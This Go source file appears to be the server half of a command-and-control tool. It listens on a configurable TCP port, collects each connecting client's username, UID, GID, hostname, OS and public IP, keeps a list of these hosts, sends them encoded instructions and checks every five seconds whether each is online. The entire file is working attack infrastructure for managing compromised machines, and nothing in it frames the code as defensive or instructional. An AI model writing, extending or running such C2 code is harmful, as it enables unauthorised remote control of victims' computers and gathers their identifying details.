package cmd

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/spf13/viper"
)

type Client struct {
	ClientBasicInfo
	Conn     net.Conn
	IsOnline bool
}

type ClientBasicInfo struct {
	Username        string
	UID             string
	GID             string
	OperatingSystem string
	Hostname        string
	PublicIP        string
}

type Instructions struct {
	IsHeartbeat bool
	Message     string
}

type Response struct {
	Message string
}

var (
	C2Port     string = "1302"
	clientList []Client
)

func (c Client) Instruct(i Instructions) error {
	enc := gob.NewEncoder(c.Conn)
	err := enc.Encode(i)
	if err != nil {
		return err
	}
	return nil
}

func Server() {
	p := viper.GetString("Server.Port")
	if p != "" {
		C2Port = p
	}
	go WebServer()

	ln, err := net.Listen("tcp", ":"+C2Port)
	if err != nil {
		log.Fatalf("Error happened listening on C2 port: %v\n", err)
	}
	log.Printf("Listening on port %v...", C2Port)
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error happened accepting connection: %v\n", err)
		}
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	ID, err := getClient(conn)
	if err != nil {
		log.Printf("Error happened receiving OS information: %v\n", err)
	}
	fmt.Printf("Got info from new user:\nUsername: %v\nUID: %v\nGID: %v\nHostname: %v\nOS: %v\n", clientList[ID].ClientBasicInfo.Username,
		clientList[ID].ClientBasicInfo.UID, clientList[ID].ClientBasicInfo.GID, clientList[ID].ClientBasicInfo.Hostname,
		clientList[ID].ClientBasicInfo.OperatingSystem)

	go Heartbeat(ID)
}

func Heartbeat(ID int) {
	for {
		inst := Instructions{
			IsHeartbeat: true,
			Message:     "PING",
		}
		clientList[ID].Instruct(inst)
		resp, err := ServerMessageReceiver(clientList[ID].Conn)
		if err == nil && resp.Message == "PONG" {
			fmt.Printf("Client %v is online!\n", clientList[ID].ClientBasicInfo.Hostname)
			clientList[ID].IsOnline = true
		} else {
			fmt.Printf("Client %v is offline :(\n", clientList[ID].ClientBasicInfo.Hostname)
			clientList[ID].IsOnline = false
			return
		}

		time.Sleep(time.Second * 5)
	}
}

func ServerMessageReceiver(conn net.Conn) (Response, error) {
	dec := gob.NewDecoder(conn)
	c := new(Response)
	err := dec.Decode(c)
	if err != nil {
		return Response{}, err
	}
	return *c, nil
}

func getClient(conn net.Conn) (int, error) {
	dec := gob.NewDecoder(conn)
	basicC := ClientBasicInfo{}
	err := dec.Decode(&basicC)
	if err != nil {
		return -1, err
	}

	for i, v := range clientList {
		sameClient := basicC.Username == v.ClientBasicInfo.Username &&
			basicC.PublicIP == v.ClientBasicInfo.PublicIP &&
			basicC.Hostname == v.ClientBasicInfo.Hostname

		if sameClient == true {
			fmt.Printf("\nCLIENT ALREADY PRESENT, SETTING TO ONLINE\n\n")
			clientList[i].IsOnline = true
			clientList[i].Conn = conn
			return i, nil
		} else {
			fmt.Println("Unequal!")
		}
	}
	newC := Client{}
	newC.ClientBasicInfo = basicC
	newC.Conn = conn
	newC.IsOnline = true

	fmt.Printf("\nCLIENT NOT PRESENT, ADDING TO LIST\n\n")
	clientList = append(clientList, newC)
	return len(clientList) - 1, nil
}
